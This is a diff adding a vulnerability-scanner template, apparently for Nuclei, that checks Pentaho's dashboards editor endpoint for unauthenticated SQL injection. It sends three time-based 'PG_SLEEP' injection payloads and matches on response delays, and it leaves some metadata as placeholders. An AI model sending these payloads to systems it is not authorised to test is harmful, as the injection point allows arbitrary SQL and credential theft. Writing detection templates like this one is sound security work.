@@ -1,0 +1,23 @@
+id: Pentaho-editor-sqli
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: Pentaho 业务分析平台在/pentaho/api/repos/dashboards/editor路径query参数存在SQL注入漏洞，攻击者可未授权执行任意SQL语句，获取账号密码等敏感信息，进一步接管系统
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/P8-1Pentaho-%E4%B8%9A%E5%8A%A1%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0-SQL?id=p8-1pentaho-%e4%b8%9a%e5%8a%a1%e5%88%86%e6%9e%90%e5%b9%b3%e5%8f%b0-sql
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/pentaho/api/repos/dashboards/editor?command=executeQuery&datasource=pentaho_operations_mart&require-cfg.js&query=%3BSELECT+PG_SLEEP%283%29--"
+      - "{{BaseURL}}/pentaho/api/repos/dashboards/editor?command=executeQuery&datasource=pentaho_operations_mart&require-cfg.js&query=%3BSELECT+PG_SLEEP%286%29--"
+      - "{{BaseURL}}/pentaho/api/repos/dashboards/editor?command=executeQuery&datasource=pentaho_operations_mart&require-cfg.js&query=%3BSELECT+PG_SLEEP%289%29--"
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
